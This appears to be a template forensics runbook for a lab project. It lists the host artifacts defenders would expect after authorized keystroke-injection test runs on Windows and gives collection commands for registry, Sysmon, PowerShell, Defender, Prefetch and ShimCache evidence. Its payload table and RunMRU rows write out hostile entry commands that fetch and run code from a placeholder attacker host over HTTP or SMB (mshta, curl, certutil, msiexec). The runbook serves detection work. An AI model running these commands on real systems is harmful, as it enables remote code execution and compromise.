# W4.3 — Blue-Team Artifact Runbook (TEMPLATE)

**AUTHORIZATION / POSTURE**: lab-only defensive forensics. Expected
host artifacts for the six P3 payload families (COORDINATION.md
contract #4) after an authorized QR-scanner keystroke-injection run
(Win+R → payload) on an owned lab VM. This is a collection aid for the
blue team, not an attack document: every pattern below describes what
*defenders* should look for.

## Status

**TEMPLATE — no VM exercise has been performed.** Every
`expected_value_pattern` cell is prefixed `TEMPLATE:` until the
payload is actually fired on the lab VM (P0 capture + P3 payload).
When a payload is exercised:

1. run the collection commands below, record observed values in
   `detection/runbook-results/` (one file per payload id),
2. drop the `TEMPLATE:` prefix from the verified rows,
3. re-validate the table row-for-row against
   `payloads/manifest.yaml` (contract #4) — payload IDs must match
   verbatim.

Until then, treat all patterns as expectations, not observations.

## Payload set (contract #4 — frozen P3 IDs)

| payload id    | runner      | entry (Win+R, placeholder targets only)                                    |
|---------------|-------------|---------------------------------------------------------------------------|
| ps-enc-001    | powershell  | `powershell -w hidden -enc <base64>` (inline)                              |
| mshta-001     | mshta       | `mshta http://attacker.example/staging/payload.hta`                       |
| curl-001      | curl        | `cmd /c "curl.exe -sS -o %TEMP%\demo.exe http://attacker.example/staging/demo.exe && %TEMP%\demo.exe"` |
| certutil-001  | certutil    | `cmd /c "certutil -urlcache -f http://attacker.example/staging/demo.exe %TEMP%\demo.exe && %TEMP%\demo.exe"` |
| msiexec-001   | msiexec     | `msiexec /i \\10.10.10.10\lab\setup.msi /qn`                              |
| unc-001       | unc         | `\\10.10.10.10\lab\tool.exe`                                              |

All network endpoints are placeholders — `attacker.example` and the
RFC1918 `10.10.10.10` (example-only, per P3's targets.toml.example);
the lab replaces them with the owned rig endpoints at exercise time.
`amsi` verdict column of the manifest governs the AMSI rows: if the
manifest says `bypassed`, the expected 1116 row is *absence* of a
detection event; if `blocked`, expect the 1116 detection below.
As of 2026-10-14 every manifest entry is `amsi: na`, so AMSI
expectations stay fully TEMPLATE until P3's
`payloads/results/killchain.csv` verdicts land.

**Manifest cross-validation**: rows in this runbook were checked
row-for-row against `payloads/manifest.yaml` (branch
`phase/p3-payloads`, commit `8276995`) — all six payload IDs match
verbatim, runners match the table above, staging is inline only for
ps-enc-001 (staged for the rest), and `win_build` floors are 1507
(ps-enc-001) and 1803 (curl-001) with "any" for the others. Entry
strings and process-lineage expectations were then synchronized with
P3's actual rendered corpus via `python3 payloads/run_matrix.py
payloads/targets.toml.example --dry-run` (curl-001/certutil-001 wrap
in `cmd /c "..."` with an `&&` exec chain; msiexec-001 and unc-001
are SMB/UNC forms, not HTTP).

## Expected artifacts per payload

Column key: `source` = where the evidence lives on the endpoint.
`expected_value_pattern` = what a defender should grep/verify.

| payload_id | artifact | source | expected_value_pattern | collection_command |
|---|---|---|---|---|
| ps-enc-001 | RunMRU | `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` | TEMPLATE: one value `a`..`z` contains `powershell -w hidden -enc <base64>` (typed command + `\x01` terminator) | `reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /s` |
| ps-enc-001 | Sysmon EID 1 lineage | Sysmon Operational log | TEMPLATE: child `powershell.exe` with `ParentImage` = `...\explorer.exe` (Run-dialog child), CommandLine contains `-w hidden -enc`; OriginalFileName `PowerShell.EXE` | `wevtutil qe Microsoft-Windows-Sysmon/Operational /q:"*[System[(EventID=1)]]" /f:text /rd:true` |
| ps-enc-001 | PowerShell EID 4104 script block | Microsoft-Windows-PowerShell/Operational | TEMPLATE: 4104 events with decoded script-block content (requires ScriptBlockLogging enabled; encoded `-enc` input is logged decoded) | `wevtutil qe Microsoft-Windows-PowerShell/Operational /q:"*[System[(EventID=4104)]]" /f:text /rd:true` |
| ps-enc-001 | AMSI EID 1116 | Microsoft-Windows-Windows Defender/Operational | TEMPLATE: 1116 detection with `SourceName = AMSI` naming the decoded content — only if manifest `amsi: blocked`; if `bypassed`, the expected observation is **no 1116 event** | `wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /q:"*[System[(EventID=1116)]]" /f:text /rd:true` |
| ps-enc-001 | Prefetch | `%SystemRoot%\Prefetch\` | TEMPLATE: `POWERSHELL.EXE-<hash>.pf` created at exercise time (noted: prefetch disabled on some lab VMs) | `copy %SystemRoot%\Prefetch\POWERSHELL.EXE-*.pf <evidence-dir>` |
| ps-enc-001 | ShimCache | `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache` | TEMPLATE: `powershell.exe` entry (execution-order + last-modified timestamp) | `reg save HKLM\SYSTEM system.hiv` then `AppCompatCacheParser.py -f system.hiv` (or export via `reg query ... /s` and parse offline) |
| mshta-001 | RunMRU | RunMRU key (as above) | TEMPLATE: value contains `mshta http://attacker.example/staging/payload.hta` + `\x01` | `reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /s` |
| mshta-001 | Sysmon EID 1 lineage | Sysmon Operational log | TEMPLATE: child `mshta.exe` of `explorer.exe`, CommandLine contains the `http://attacker.example/...` URL | `wevtutil qe Microsoft-Windows-Sysmon/Operational /q:"*[System[(EventID=1)]]" /f:text /rd:true` |
| mshta-001 | PowerShell EID 4104 script block | Microsoft-Windows-PowerShell/Operational | TEMPLATE: n/a — `mshta` runs JScript/VBScript, no PowerShell script blocks (row retained for uniformity) | `wevtutil qe Microsoft-Windows-PowerShell/Operational /q:"*[System[(EventID=4104)]]" /f:text /rd:true` |
| mshta-001 | AMSI EID 1116 | Windows Defender/Operational | TEMPLATE: 1116 with `SourceName = AMSI` if JScript content is signature-matched; `mshta` is a classic AMSI-sensitive surface — verdict depends on manifest `amsi:` field | `wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /q:"*[System[(EventID=1116)]]" /f:text /rd:true` |
| mshta-001 | Prefetch | `%SystemRoot%\Prefetch\` | TEMPLATE: `MSHTA.EXE-<hash>.pf` at exercise time | `copy %SystemRoot%\Prefetch\MSHTA.EXE-*.pf <evidence-dir>` |
| mshta-001 | ShimCache | AppCompatCache | TEMPLATE: `mshta.exe` entry | `reg save HKLM\SYSTEM system.hiv` then AppCompatCacheParser |
| curl-001 | RunMRU | RunMRU key (as above) | TEMPLATE: value contains `cmd /c "curl.exe -sS -o %TEMP%\demo.exe http://attacker.example/staging/demo.exe && %TEMP%\demo.exe"` + `\x01` | `reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /s` |
| curl-001 | Sysmon EID 1 lineage | Sysmon Operational log | TEMPLATE: chain `explorer.exe` → `cmd.exe` (Run-dialog child, CommandLine `/c` wrapper) → `curl.exe` (CommandLine `-sS -o` + URL), plus a separate EID 1 when the downloaded `%TEMP%\demo.exe` executes via the `&&` chain (curl.exe ships with Win10 1803+) | `wevtutil qe Microsoft-Windows-Sysmon/Operational /q:"*[System[(EventID=1)]]" /f:text /rd:true` |
| curl-001 | PowerShell EID 4104 script block | Microsoft-Windows-PowerShell/Operational | TEMPLATE: n/a — no PowerShell involvement | `wevtutil qe Microsoft-Windows-PowerShell/Operational /q:"*[System[(EventID=4104)]]" /f:text /rd:true` |
| curl-001 | AMSI EID 1116 | Windows Defender/Operational | TEMPLATE: no 1116 expected from `curl.exe` itself (not an AMSI provider); the downloaded artifact may trigger Defender real-time scan separately (EID 1116 with SourceName not AMSI is out of this row's scope) | `wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /q:"*[System[(EventID=1116)]]" /f:text /rd:true` |
| curl-001 | Prefetch | `%SystemRoot%\Prefetch\` | TEMPLATE: `CMD.EXE-<hash>.pf`, `CURL.EXE-<hash>.pf`, and `<DEMO.EXE>-<hash>.pf` records at exercise time (noted: prefetch disabled on some lab VMs) | `copy %SystemRoot%\Prefetch\CMD.EXE-*.pf %SystemRoot%\Prefetch\CURL.EXE-*.pf <evidence-dir>` |
| curl-001 | ShimCache | AppCompatCache | TEMPLATE: `curl.exe` + downloaded `demo.exe` entries (demo.exe executed via the `&&` chain) | `reg save HKLM\SYSTEM system.hiv` then AppCompatCacheParser |
| certutil-001 | RunMRU | RunMRU key (as above) | TEMPLATE: value contains `cmd /c "certutil -urlcache -f http://attacker.example/staging/demo.exe %TEMP%\demo.exe && %TEMP%\demo.exe"` + `\x01` | `reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /s` |
| certutil-001 | Sysmon EID 1 lineage | Sysmon Operational log | TEMPLATE: chain `explorer.exe` → `cmd.exe` (Run-dialog child, CommandLine `/c` wrapper) → `certutil.exe` (CommandLine `-urlcache` + URL), plus a separate EID 1 when the downloaded `%TEMP%\demo.exe` executes via the `&&` chain | `wevtutil qe Microsoft-Windows-Sysmon/Operational /q:"*[System[(EventID=1)]]" /f:text /rd:true` |
| certutil-001 | PowerShell EID 4104 script block | Microsoft-Windows-PowerShell/Operational | TEMPLATE: n/a — LOLBin, not PowerShell | `wevtutil qe Microsoft-Windows-PowerShell/Operational /q:"*[System[(EventID=4104)]]" /f:text /rd:true` |
| certutil-001 | AMSI EID 1116 | Windows Defender/Operational | TEMPLATE: no AMSI event expected from `certutil.exe` download stage (non-provider); Defender may alert on the payload file separately | `wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /q:"*[System[(EventID=1116)]]" /f:text /rd:true` |
| certutil-001 | Prefetch | `%SystemRoot%\Prefetch\` | TEMPLATE: `CMD.EXE-<hash>.pf`, `CERTUTIL.EXE-<hash>.pf`, and `<DEMO.EXE>-<hash>.pf` records at exercise time | `copy %SystemRoot%\Prefetch\CMD.EXE-*.pf %SystemRoot%\Prefetch\CERTUTIL.EXE-*.pf <evidence-dir>` |
| certutil-001 | ShimCache | AppCompatCache | TEMPLATE: `certutil.exe` + downloaded `demo.exe` entries (demo.exe executed via the `&&` chain) | `reg save HKLM\SYSTEM system.hiv` then AppCompatCacheParser |
| msiexec-001 | RunMRU | RunMRU key (as above) | TEMPLATE: value contains `msiexec /i \\10.10.10.10\lab\setup.msi /qn` + `\x01` | `reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /s` |
| msiexec-001 | Sysmon EID 1 lineage | Sysmon Operational log | TEMPLATE: child `msiexec.exe` of `explorer.exe`, CommandLine contains `/i` and the UNC path `\\10.10.10.10\lab\setup.msi` (SMB-staged, not HTTP); expect follow-on EID 1s for the msiexec service-side instance and installer-spawned custom-action processes | `wevtutil qe Microsoft-Windows-Sysmon/Operational /q:"*[System[(EventID=1)]]" /f:text /rd:true` |
| msiexec-001 | PowerShell EID 4104 script block | Microsoft-Windows-PowerShell/Operational | TEMPLATE: n/a — unless the MSI embeds PowerShell custom actions (record if seen) | `wevtutil qe Microsoft-Windows-PowerShell/Operational /q:"*[System[(EventID=4104)]]" /f:text /rd:true` |
| msiexec-001 | AMSI EID 1116 | Windows Defender/Operational | TEMPLATE: no AMSI event expected at install stage (MSI engine is not an AMSI content provider) | `wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /q:"*[System[(EventID=1116)]]" /f:text /rd:true` |
| msiexec-001 | Prefetch | `%SystemRoot%\Prefetch\` | TEMPLATE: `MSIEXEC.EXE-<hash>.pf` at exercise time (may pre-exist — check timestamps) | `copy %SystemRoot%\Prefetch\MSIEXEC.EXE-*.pf <evidence-dir>` |
| msiexec-001 | ShimCache | AppCompatCache | TEMPLATE: `msiexec.exe` entry; installed PE files appear when executed | `reg save HKLM\SYSTEM system.hiv` then AppCompatCacheParser |
| unc-001 | RunMRU | RunMRU key (as above) | TEMPLATE: value contains `\\10.10.10.10\lab\tool.exe` path + `\x01` | `reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /s` |
| unc-001 | Sysmon EID 1 lineage | Sysmon Operational log | TEMPLATE: Run-dialog execution over UNC creates process from `\\10.10.10.10\lab\tool.exe` (network image path) with ParentImage `explorer.exe`; look also for SMB2 activity (EID 3 network events to 10.10.10.10 over TCP 445) and EID 11 file-create in WebDAV/WebView cache paths | `wevtutil qe Microsoft-Windows-Sysmon/Operational /q:"*[System[(EventID=1)]]" /f:text /rd:true` |
| unc-001 | PowerShell EID 4104 script block | Microsoft-Windows-PowerShell/Operational | TEMPLATE: n/a — no PowerShell stage (unless the UNC payload is a .ps1) | `wevtutil qe Microsoft-Windows-PowerShell/Operational /q:"*[System[(EventID=4104)]]" /f:text /rd:true` |
| unc-001 | AMSI EID 1116 | Windows Defender/Operational | TEMPLATE: no AMSI event at launch (direct PE execution); script-based UNC payload would change this — record actual | `wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /q:"*[System[(EventID=1116)]]" /f:text /rd:true` |
| unc-001 | Prefetch | `%SystemRoot%\Prefetch\` | TEMPLATE: prefetch of executed binary from UNC path (prefetch records the file path; historically UNC/WebDAV executables may produce `\\\?\UNC\` style volume entries — verify) | `copy %SystemRoot%\Prefetch\<HASH>.pf <evidence-dir>` (search by timestamp; path recorded inside the .pf) |
| unc-001 | ShimCache | AppCompatCache | TEMPLATE: executed UNC binary path entry with last-modified timestamp | `reg save HKLM\SYSTEM system.hiv` then AppCompatCacheParser |

## Artifact notes

- **RunMRU** — user-session registry, survives reboots; the Run
  dialog appends the last typed command per letter `a`..`z`
  (MRU list). Values end with `\x01`. Requires the user hive
  (live: `HKCU`; offline: `NTUSER.DAT`).
- **Sysmon EID 1** — requires Sysmon installed with process-create
  logging on the lab VM (P0 baseline image). The chain of interest is
  `explorer.exe` (Run dialog) → runner/LOLBin child; attacker-typical
  child-of-explorer lineage is itself a weak signal worth recording.
- **PowerShell EID 4104** — only meaningful where PowerShell executes
  script content; requires ScriptBlockLogging (GPO/registry) enabled
  on the lab image.
- **AMSI EID 1116** — Microsoft Defender detection event; the
  `SourceName: AMSI` variant specifically indicates content caught in
  an AMSI-integrating host (PowerShell/JScript). Respect the manifest
  `amsi:` verdict when setting expectations.
- **Prefetch** — binary-name + last-run-times evidence; disabled on
  lab images with SSD-era tweaks or Server SKUs — confirm it exists on
  the baseline image before relying on these rows. Parsing (.pf) is
  offline (e.g. PECmd); collection here is file copy.
- **ShimCache (AppCompatCache)** — machine hive; proves execution
  order/filename (Win7+) with caveats; needs offline parsing
  (AppCompatCacheParser or equivalents).

## Payload-specific IOCs (from the P3 manifest notes)

- **certutil-001 — `CertUtil URL Cache` User-Agent**: P3 flags
  certutil's download request UA as a strong IOC. It is visible on
  the rig/lab-network side (attacker.example access logs, lab proxy
  capture), not in the six host artifacts above — include it in the
  collection scope for every certutil-001 exercise.
- **msiexec-001 — MsiInstaller eventlog + SMB artifacts (primary for
  this form)**: P3's template header flags the `MsiInstaller`
  (Application log) event source and SMB traffic. The rendered
  command is UNC-staged (`\\10.10.10.10\lab\setup.msi`), so expect
  MsiInstaller events (MSI source, e.g. 11707 install-success /
  11708 install-failure, 1035/1036 product state) for the install and
  SMB2 reads over TCP 445 — collect
  `wevtutil qe Application /q:"*[System[Provider[@Name='MsiInstaller']]]" /f:text /rd:true`
  alongside the rows above.

## Physical / VM exercise slots (open)

| slot | owner | blocking item |
|---|---|---|
| Lab VM image with Sysmon + ScriptBlockLogging + Defender baseline confirmed | P0 (W0.1) | needs W0.1 lab baseline output |
| Each payload fired once via rig + capture (contract #1 logs from the same runs) | P0 rig / P3 payloads | needs P3 manifest + P0 rig runs |
| `detection/runbook-results/` observations per payload id | P4 (human-in-the-loop after VM runs) | blocked on the above |
